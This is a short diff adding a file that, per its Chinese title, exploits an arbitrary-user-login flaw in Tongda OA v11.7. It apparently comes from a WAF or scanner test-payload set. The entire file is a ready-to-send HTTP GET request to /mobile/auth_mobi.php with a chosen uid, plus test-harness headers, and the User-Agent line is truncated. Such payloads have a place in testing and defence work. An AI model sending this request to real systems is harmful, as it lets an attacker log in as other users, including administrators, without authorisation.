@@ -1,0 +1,9 @@
+# 利用【通达OA v11.7 在线任意用户登录漏洞】-30000313
+# 通达OA v11.7 存在在线任意用户登录漏洞
+GET /mobile/auth_mobi.php?acid=30000313&isAvatar=1&uid=12&P_VER=0&bid=hd_tag_m8mv269e HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv269e
+RM-PRO-Token: d68cd6349176c65d6eff6bc7bdcaa7b0
+RM-PRO-Time: 1742808560350
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML
+
